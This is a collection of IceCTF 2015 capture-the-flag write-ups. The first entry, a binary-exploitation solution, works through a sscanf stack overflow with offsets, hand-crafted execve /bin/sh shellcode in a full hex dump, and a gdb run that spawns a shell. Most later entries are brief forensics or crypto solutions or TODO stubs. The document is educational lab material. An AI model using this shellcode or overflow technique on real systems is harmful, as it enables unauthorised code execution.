Running it:

```bash
$ ./what
IMPOSTOR!
```

Neither `strace -f ./what` nor `ltrace -f ./what` tell us more about why the binary only returns `IMPOSTOR!`.

So we analyze the binary in `radare2`:

```bash
[0x08048460]> aa
[0x08048460]> afl | sort -k1 | column -t
0x080483e0  16   2  sym.imp.getegid
0x080483f0  16   2  sym.imp.fwrite
0x08048400  16   2  sym.imp.getenv
0x08048420  16   2  sym.imp.exit
0x08048430  16   2  sym.imp.__libc_start_main
0x08048440  16   2  sym.imp.__isoc99_sscanf
0x08048450  16   2  sym.imp.setresgid
0x08048460  34   1  entry0
0x0804869e  211  6  main
```

Decompiling `main`:

![](./main.png)

We notice following:

* It checks if we provide two arguments: `ausgeschnitzel` and `flugelfragen` - Both pseudo-German words without any meaning
* It also checks if the environment variable `AUTH` is set
* It calls an unknown (stripped) function at address `0x804857d` with parameter `AUTH`

We try our luck again by fulfilling the check requirements:

```bash
$ AUTH='' ./what ausgeschnitzel flugelfragen
ERROR: Incorrect format, should be 'WHO/WHY/ !
```

Decompiling function @ `0x804857d`:

![](./fcn-804857d.png)

We notice:

* `__iso99_scanf` is called and one of the arguments. The format is given at `0x0804859c` and printing the string via `radare2` yields:
```bash
[0x08048460]> ps @ str.____________ 
%[^/]/%[^/]/
```
* If the buffer string (content of `AUTH`) given to `__iso99_scanf` fits the format, we jump to `0x080485e5`
* It then checks if the second format argument is any of the strings `schadenfreude`, `faultier` or `drachenfutter` (Real German Words) and exits if otherwise
* After that, it writes "Authenticating..." to `stderr` and returns

We set `AUTH` once again according to the format and try our luck again:

```bash
$ AUTH='hello/faultier/' ./what ausgeschnitzel flugelfragen
Authenticating...
All done!
```

Reading the strings from `AUTH` (`WHO/WHAT/`) using `__iso99_scanf` without any further length checks leads to a stack overflow in this case.

The buffer to `WHO` is at `ebp - 0x88` (see `0x08048592`) and the buffer to `WHAT` is at `ebp - 0x108`.
However, `WHAT` has to be one of the above mentioned strings, e.g. `faultier`, which means we have to provide our payload to `WHO`.

To control `EIP`/`rip` we have to supply `4` (`ebp`) + `0x88`(=`136`) = `140` (offset to `WHO` buffer) bytes.

Since the format uses the character `0x2f` (`/`) to split between `WHO` and `WHAT`, we cannot use standard shellcodes such as [this shell-storm shellcode](http://shell-storm.org/shellcode/files/shellcode-841.php).

Adding to that, we cannot use whitecharacters, since `__iso99_scanf` stops reading at them, too!

However, with the aid of [ODA](https://www.onlinedisassembler.com/odaweb/), disassembled code and an [Opcode reference manual](http://ref.x86asm.net/coder32.html), we can craft our own shellcode (and learn something)!

[This python code](./solve.py) modifies two out of three push instructions used to push the string `/bin///sh` to the stack and moving `0xb` to `eax` with some easy `add` and `sub` calculations to circumvent having any of the banned bytes in our shellcode.

Note that we have to rely on luck, since we cannot leak any stack address and have to guess a possible pointer (e.g. through `gdb`) to a crafted NOP-sled.

Running the solution writes our shellcode to a binary named `in`:

```bash
$ python solve.py
$ xxd in
0000000: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000010: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000020: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000030: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000040: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000050: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000060: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000070: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000080: 5045 5349 5045 4449 5045 4250 c8d2 ffff  PESIPEDIPEBP....
0000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000200: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000210: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000220: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000230: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000240: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000250: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000260: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000270: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000280: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000290: 6a68 b806 0606 5205 2929 2921 50b8 0639  jh....R.)))!P..9
00002a0: 4045 0529 2929 2950 89e3 31c9 6a41 5883  @E.))))P..1.jAX.
00002b0: e836 99cd 80                             .6...
```

We can verify that our shellcode doesnt contain any whitecharacters to stop `scanf` from reading using [this small C program](./scanf-test.c):

```bash
$ python -c 'print "hellofriend\x0b\hello"' | ./scanf-test
hellofriend
$ echo -n "/faultier/" >> in
$ cat in | ./scanf-test | xxd
0000000: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000010: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000020: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000030: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000040: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000050: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000060: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000070: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
0000080: 5045 5349 5045 4449 5045 4250 c8d2 ffff  PESIPEDIPEBP....
0000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00001f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000200: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000210: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000220: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000230: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000240: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000250: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000260: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000270: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000280: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000290: 6a68 b806 0606 5205 2929 2921 50b8 0639  jh....R.)))!P..9
00002a0: 4045 0529 2929 2950 89e3 31c9 6a41 5883  @E.))))P..1.jAX.
00002b0: e836 99cd 802f 6661 756c 7469 6572 2f0a  .6.../faultier/.
```

The python script should work, but somehow I don't get the same result as running the solution manually using `gdb` and with the generated shellcode. Please help me out, if you know why.

To get the flag, we simply have to set `AUTH` in a terminal and our args in `gdb`:

```bash
$ python solve.py
$ md5sum in
0df954f16cf78242a03d237b4ff53991  in
$ export AUTH=$(cat ./in)/faultier/
gdb-peda$ set args ausgeschnitzel flugelfragen
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/ice/what/what ausgeschnitzel flugelfragen
Authenticating...
process 7328 is executing new program: /bin/dash
$ xxd flag.txt
[New process 7332]
process 7332 is executing new program: /usr/bin/xxd
0000000: 666c 6167 5f73 7175 6561 6d69 7368 5f6f  flag_squeamish_o
0000010: 7373 6966 7261 6765 0a                   ssifrage.
$ [Inferior 2 (process 7332) exited normally]
Warning: not running or target is remote
```

The flag is `flag_squeamish_ossifrage`.

## Other write-ups and resources

* <http://blog.atx.name/icectf/#What>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: 2x0r

**Category:** Cryptography
**Points:** 80
**Description:** 

> <p>So it turns out that repeated XOR isn't exactly secure. After realizing this, Idobe Corp decided to create a much more secure standard, which it calls 2x0r.</p><p>They provided a sample implementation [here](./2x0r.py).</p><p>They also dared us to get the flag! Ofcourse, we take no such challenge lightly. Beat it out of them if you have to! [encrypted](./encrypted)</p>

**Hint:**

> Does doubling up really make things harder? Oh, and they said they were so confident in their new encryption that they used short keys.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#2x0r>
# IceCTF 2015: Agents

**Category:** Cryptography
**Points:** 130
**Description:** 

> <p>Evilcorp is up to their no good buisness again! Apparently, it has been using a service to send commands to its agents using RSA encryption. The public keys are stored locally on the server, and the agents are issued an ID number corresponding to their key.</p><p>Can you intercept their messages? <code>nc vuln2015.icec.tf 31896</code>.</p><p>We also got their source: [server.py](./server.py)</p>

**Hint:**

> We suspect Agent 743 is compromised. Release his intelligence to the masses. We also got word from our spy that he wasn't able to decrypt the message with his private key. Evilcorp is working on issuing their (trusted)agents with new, larger keys, but has not yet.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Agents>
# IceCTF 2015: Alternate RSA

**Category:** Cryptography
**Points:** 150
**Description:** 

> <p>I got bored with RSA and decided to try something old... It's secure though, right?</p><p>[knapsack.py](./knapsack.py) [pubkey.txt](./pubkey.txt) [ciphertext.txt](./ciphertext.txt)</p>

**Hint:**

> There must be a glitch in the matrix.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IceCTF 2015: Cryptic Crypto

**Category:** Cryptography
**Points:** 35
**Description:** 

> Can you take a look at this non-sense [wall of text](./text.txt) we stumbled upon?

**Hint:**

> We're fairly sure this contains english text

## Write-up

(TODO)

## Other write-ups and resources

* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Cryptic%20Crypto/Solution.txt>
# IceCTF 2015: Diary

**Category:** Cryptography
**Points:** 60
**Description:** 

> <p>A friend of yours has been using this [script](./diary.py) to encrypt his diary. Being the nosy person you are, you must take a look! Can you decrypt it?</p><p>[encrypted](./encrypted)</p>

**Hint:**

> This code reminds me of something...

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Diary/Solution.py>
# IceCTF 2015: Entropy

**Category:** Cryptography
**Points:** 110
**Description:** 

> <p>We managed to get the flag, but it's encrypted! We found the keyserver that was used though, and stole its source. Could you figure out a way to decrypt the flag? You can get public keys from the keyserver with <code>nc vuln2015.icec.tf 30896</code>.</p><p>[server.py](./server.py) [flag.txt](./flag.txt)</p>

**Hint:**

> Maybe some keys are brother and sister!

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Entropy>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: Farm Animals

**Category:** Cryptography
**Points:** 65
**Description:** 

> We found this [message](./crypto1.png) written in strange symbols, can you read it for us?

**Hint:**

> Those pesky little pigs are always up to something

## Write-up

(TODO)

## Other write-ups and resources

* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Farm%20Animals/Solution.txt>
# IceCTF 2015: Numb3rs

**Category:** Cryptography
**Points:** 30
**Description:** 

> 05110006_00111507000104190802_08130308020418

**Hint:**

> I think they come in pairs

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Numb3rs/Solution.txt>
# IceCTF 2015: Numeric

**Category:** Cryptography
**Points:** 20
**Description:** 

> bG9zdF9pbl90aGVfbnVtYmVycwo=

**Hint:**

> This code reminds me of something...

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Numeric/Solution.txt>
# IceCTF 2015: ROT13

**Category:** Cryptography
**Points:** 25
**Description:** 

> Can you decipher [this secret message](./code.txt)?

**Hint:**

> This cipher better be crackable...

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/ROT13/Solution.txt>
# IceCTF 2015: RSA

**Category:** Cryptography
**Points:** 70
**Description:** 

> <p>We figured out our enemies were sending messages encrypted with RSA. We managed to get their data, but we suck at math. Can you do it?</p><p>Here's the [data](./data).</p><p>P.S: The flag isn't a number, but ascii text.</p>

**Hint:**

> Try Wikipedia

## Write-up

(TODO)

## Other write-ups and resources

* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/RSA/RSA.py>
# IceCTF 2015: RSA3

**Category:** Cryptography
**Points:** 90
**Description:** 

> <p>We managed to pick up another RSA transmission from our enemies. This time though, they remembered to clean up the private key data. Can you get it anyway? [data](./data)</p>

**Hint:**

> Think you can crack it anyway? It should be a short message.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#RSA3>
# IceCTF 2015: Sausages

**Category:** Cryptography
**Points:** 200
**Description:** 

> So our friend Steve challenged us to hack into his server. You can access it at <code>ssh -l ctf -p 2222 vuln2015.icec.tf</code>. He remembered to turn off password authentication though. Oh, we also found his GitHub account, it's <a target='_blank' href='https://github.com/icectf-steve'>here</a>.

**Hint:**

> <p>This time you'll really have to break RSA. There's something wrong with his key, can you find it?</p>

## Write-up

(TODO)

## Other write-ups and resources

# IceCTF 2015: Alien Contact

**Category:** Forensics
**Points:** 200
**Description:** 

> SETI came to us with this [sound recording](./qYnSS1aJ5.wav) and they claim that there's an intelligent lifeform trying to contact us. Can you see if you can make any sense of it?

**Hint:**

> <p>I find television very educating. Every time somebody turns on the set, I go into the other room and read a book. ~ Groucho Martin1 950</p><p><small>For all our foreign competitors, if you've solved this problem, please message us on IRC.</small></p>

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/IceCTF/Problems-2015/blob/master/stage4/forensics/alien_contact/solution.md>
# IceCTF 2015: Document Troubles

**Category:** Forensics
**Points:** 30
**Description:** 

> We found this [document](file.docx), and we think it contains the flag. Can you find it?

**Hint:**

> What exactly is a .docx file?

## Write-up

by [polym](https://github.com/abpolym)

We are given a file with a `.docx` file extension.

However, in reality, it actually is a zip file, which contains a file named `flag.txt` that contains our flag:

```bash
+bash-4.3$ file file.docx 
file.docx: Zip archive data, at least v2.0 to extract
+bash-4.3$ 7z x file.docx -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: file.docx

Extracting  word/numbering.xml
Extracting  word/settings.xml
Extracting  word/fontTable.xml
Extracting  word/styles.xml
Extracting  word/document.xml
Extracting  word/_rels/document.xml.rels
Extracting  _rels/.rels
Extracting  [Content_Types].xml
Extracting  flag.txt

Everything is Ok

Files: 9
Size:       13393
Compressed: 4385
+bash-4.3$ cd out/
+bash-4.3$ cat flag.txt 
this_would_be_the_flag_you_are_looking_for
```

The flag is `this_would_be_the_flag_you_are_looking_for`.

PS: It could be that Window's `.docx` files are zip files in general - haven't looked that up.

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://www.hasnydes.us/2015/09/writeup-ice-ctf/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Document%20Troubles/Solution.txt>
# IceCTF 2015: Epilepsy Warning

**Category:** Forensics
**Points:** 110
**Description:** 

> It hurts my head to look at this [GIF](./rave.gif), just get it away from me...

**Hint:**

> All your senses need to be on alert for this one, keep your eyes peered and listen

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/IceCTF/Problems-2015/blob/master/stage3/forensics/epilepsy_warning/solution.md>
* [Wrap-up in Icelandic](https://www.youtube.com/watch?v=gqAoCpUfXaI&feature=youtu.be&t=22m5s)

We are given a gif that really makes our heads hurt:

![](./rave.gif)

First, we extract all three individual frames using `convert rave.gif rave.png`:

* `rave-0.png`, which looks like a TV static stream
* `rave-1.png` and `rave-2.png`, which are pitch black and seem to contain nothing but black pixels

To show hidden data in `rave-1.png` and `rave-2.png`, we apply `stegsolve` to both of them:

* `rave-1.png` shows the text `A-Law Little 44100` in `Colour Inversion (Xor)` mode:

![](./stegsolve-1.png)

* `rave-2.png` shows a barcode in `Green plane 1` mode:

![](./stegsolve-2.png)

Scanning the barcode gives us `flag_some_barcode_and_`.

The second part of the flag can be solved by converting the TV static png to RGB values using `convert rave-0.png rave-0.rgb`.

Then, we can import `rave-0.rgb` as `Raw Data` (`File->Import->Raw Data...`) and use `A-Law` encoding with `Little-endian` Byte Order and Sample rate `44100` Hz:

![](./audacity-alaw.png)

We get a weird sounding file with a noisy waveform and a voice talking in the middle of the audio file:

![](./audacity-waveform-noise.png)

To hear the voice more clear, we apply a Noise Reduction Effect (`Effect->Noise Reduction...` - First with Get Noise Profile, then with Parameters) with Parameters Noise Reduction `26`dB, Sensitivity `4.50` and Frequency `0`:

![](./audacity-noise-reduction.png)

We then get this waveform:

![](./audacity-waveform-no-noise.png)

Unfortunately, I cannot speak Icelandic, but if you do the [wrap-up](https://www.youtube.com/watch?v=gqAoCpUfXaI&feature=youtu.be&t=22m5s) should explain that this robotic voice tells you to append the last part of the flag, `hidden_audio` (or maybe even says `hidden audio` in Icelandic, I don't know this :().

The complete flag is `flag_some_barcode_and_hidden_audio`

## Other write-ups and resources

* <https://github.com/IceCTF/Problems-2015/blob/master/stage3/forensics/epilepsy_warning/solution.md>
# IceCTF 2015: Husavik

**Category:** Forensics
**Points:** 85
**Description:** 

> This handy [Android App](./husavik.apk) is supposed to display the flag, but it's not working!

**Hint:**

> Only if you could get into the code...

## Write-up

by [polym](https://github.com/abpolym)

We are given an Android Application, which we can decompile using a combination of `apktool` and `jadx`.

After decompilation, we find several files inside the root directory:

```bash
+bash-4.3$ ls
AndroidManifest.xml     android                 husavik.jobf            log                     res                     tf
```

Having a look inside `AndroidManifest.xml`, we see that the MainActivity is `tf.icec.husavik.MainActivity`:

```bash
$ cat AndroidManifest.xml
[...]
        <activity android:label="@string/app_name" android:name="tf.icec.husavik.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
[...]
```

So we `cd` into the `tf/icec/husavik` directory that contain several other decompiled `.class` Methods in `.java` source code:

```bash
+bash-4.3$ tree tf/
tf/
└── icec
    └── husavik
        ├── BuildConfig.java
        ├── C0150R.java
        ├── C0151b.java
        ├── C0152c.java
        ├── MainActivity.java
        └── RedHerring.java

2 directories, 6 files
```

After looking at each source code file, we finally find a base64 encoded String in `C0151b.java`:

```bash
+bash-4.3$ cat C0151b.java
package tf.icec.husavik;
[...]
            objectOutputStream.writeObject("ZmxhZ193YWl0X3dhc250X2l0X2RhbHZpawo=");
[...]
```

Decoding this base64 encoded string reveals the flag, `flag_wait_wasnt_it_dalvik`:

```bash
+bash-4.3$ echo 'ZmxhZ193YWl0X3dhc250X2l0X2RhbHZpawo=' | base64 --decode
flag_wait_wasnt_it_dalvik
```
## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-husavik-85-forensics/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Husavik/Solution.txt>
# IceCTF 2015: Logoventures

**Category:** Forensics
**Points:** 35
**Description:** 

> I believe I misplaced something in this [image](./logo.gif), could you see if you can find it for me?

**Hint:**

> Only if you could slow down time itself

## Write-up

by [polym](https://github.com/abpolym)

We are given a gif:

![](./logo.gif)

If you look long enough at this gif, you'll notice the text switching at a certain frame.

We can use ImageMagick's `convert` tool to split the gif into its individual frames and look for unique frames:

```bash
$ +bash-4.3$ convert logo.gif logo.png
+bash-4.3$ md5 -r *.png | column -t | sort -k1
63356d1c04b210c9f7388e953cf7c7f7  logo-0.png
8f943d4a902e7c18bb5e4833b49292d3  logo-1.png
8f943d4a902e7c18bb5e4833b49292d3  logo-10.png
[...]
8f943d4a902e7c18bb5e4833b49292d3  logo-7.png
8f943d4a902e7c18bb5e4833b49292d3  logo-8.png
8f943d4a902e7c18bb5e4833b49292d3  logo-9.png
```

`logo-1.png` to `logo-66.png` are the same frame, which is the frame you see the longest.

`logo-0.png` contains our flag:

![](./logo-0.png)

The flag is `boy_this_goes_by_so_fast`.

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-logoventures-35-forensics/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Logoventures/Solution.txt>
# IceCTF 2015: Logoventures 2: Reloaded

**Category:** Forensics
**Points:** 40
**Description:** 

> <p>I know what you're thinking... Why am I storing all of this important data in images? Well, you should mind your own business.</p><p>Can you just get the information for me?</p> [Image](./logo.jpg)

**Hint:**

> The flag must eXist in the image somewhere!

## Write-up

by [polym](https://github.com/abpolym)

We are given a jpg:

![](./logo.jpg)

Reading the metadata of this jpg using `exiftool`, the flag is revealed in the User Comment Exif Data Field:

```bash
$ exiftool logo.jpg 
ExifTool Version Number         : 9.99
File Name                       : logo.jpg
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2015:12:25 18:44:38+01:00
File Access Date/Time           : 2015:12:26 00:23:09+01:00
File Inode Change Date/Time     : 2015:12:25 18:44:38+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Make                            : IceCTF
Camera Model Name               : 2015
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0230
Components Configuration        : Y, Cb, Cr, -
User Comment                    : now_youre_thinking_with_exif
Flashpix Version                : 0100
Lens Make                       : The flag you're looking for is in another property...
Quality                         : 60%
XMP Toolkit                     : Adobe XMP Core 5.5-c021 79.155772, 2014/01/13-19:44:00
Creator Tool                    : Adobe Photoshop CC 2014 (Macintosh)
Instance ID                     : xmp.iid:BC4E26831D2211E582F697A30DCEE501
Document ID                     : xmp.did:BC4E26841D2211E582F697A30DCEE501
Derived From Instance ID        : xmp.iid:BC4E26811D2211E582F697A30DCEE501
Derived From Document ID        : xmp.did:BC4E26821D2211E582F697A30DCEE501
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 600
Image Height                    : 315
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 600x315
Megapixels                      : 0.189
```

The flag is `now_youre_thinking_with_exif`.

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-logoventures-2-reloaded-40-forensics/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Logoventures%202:%20Reloaded/Solution.txt>
# IceCTF 2015: Mondrian

**Category:** Forensics
**Points:** 150
**Description:** 

> We found the bizarre <a target='_blank' href='http://web2015.icec.tf/mondrian/'>website</a> with a mysterious video, can you figure this one out for us?

**Hint:**

> The power of one, if fearless and focused, is formidable, but the power of many working together is better. ~ Gloria Macapagal Arroyo 1947

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Mondrian>
# IceCTF 2015: Ryan Gooseling

**Category:** Forensics
**Points:** 50
**Description:** 

> We found this [disk image](./disk.img), looks like the file system is b0rked... Can you take a look at it?

**Hint:**

> Where we're going we don't need file systems

## Write-up

by [polym](https://github.com/abpolym)

We are given an image:

```bash
$ +bash-4.3$ file disk.img 
disk.img: Linux rev 1.0 ext2 filesystem data (extents) (huge files)
```

Applying `foremost` on the image to carve out existing files on the system reveals three jpgs:

```bash
$ foremost disk.img
Processing: disk.img
|*|
$ tree output/
tree output/
output/
├── audit.txt
└── jpg
    ├── 00002562.jpg
    ├── 00002726.jpg
    └── 00002828.jpg

1 directory, 4 files
```

`00002562.jpg` contains the flag, `Flag_gooselings_cant_drive`:

![](./00002562.jpg)

## Other write-ups and resources

* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: Scan Me

**Category:** Forensics
**Points:** 55
**Description:** 

> I found this [QR Code](./qr.jpg) but I'm having some troubles scanning it. Be a dear and help me, won't you?

**Hint:**

> There's something off about that code... maybe it can be fixed though.

## Write-up

by [polym](https://github.com/abpolym)

We are given a snipped QR code:

![](./qr.jpg)

Fortunately, we can see what the cut parts look like - so we open `gimp`, open a new image with white background and bigger resolution (`400`x`400` instead of `355`x`355`) and fix the broken QR code:

![](./qr-fixed.png)

Then we submit this fixed QR code to [an online QR decoder](https://zxing.org/w/decode.jspx) to obtain the flag, `who_spilled_their_coffee_on_my_qr_code`.

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-scan-me-55-forensics/>
# IceCTF 2015: SHARKNADO!

**Category:** Forensics
**Points:** 60
**Description:** 

> We managed to intercept [this web traffic](./sharknado.pcap), the target was logging on to <a target='_blank' href='http://web2015.icec.tf/sharknado'>web2015.icec.tf</a>. can you look into it?

**Hint:**

> If only you could filter the packets to make things easier...

## Write-up

by [polym](https://github.com/abpolym)

We are given a pcap traffic dump.
The description hints that we should login into <http://web2015.icec.tf/sharknado> using credentials that we have to search for in the given pcap.

We open it with `wireshark` and filter the traffic by HTTP POST only requests (`http.request.method==POST`) to find this request:

![](./wireshark.png)

We follow the conversation (`Analyze->Follow->TCP Stream`) to find a username/password combination:

![](./wireshark-follow.png)

Using these credentials, we login to the website to find the flag, `flag_damn_that_movie_was_bad`.

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/SHARKNADO!/Solution.txt>
# IceCTF 2015: Facebook

**Category:** Miscellaneous
**Points:** 15
**Description:** 

> Could there be something hidden on our <a target='_blank' href='https://facebook.com/icectf'>facebook page</a>?

**Hint:**

> If I were a flag, where would I be?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Facebook/Solution.txt>
# IceCTF 2015: Not Found

**Category:** Miscellaneous
**Points:** 15
**Description:** 

> I lost this problem!!! Can you help me find it? There's a flag in it for you if you do ;)

**Hint:**

> Perhaps it's on the CDIV(194) page?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Not%20Found/Solution.txt>
# IceCTF 2015: Warm Up

**Category:** Miscellaneous
**Points:** 10
**Description:** 

> '<code>_ the Planet!</code>' Fill in the blank

**Hint:**

> You should probably watch the movie <a target='_blank' href='http://www.imdb.com/title/tt0113243/'>Hackers</a>, go on... we'll wait

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
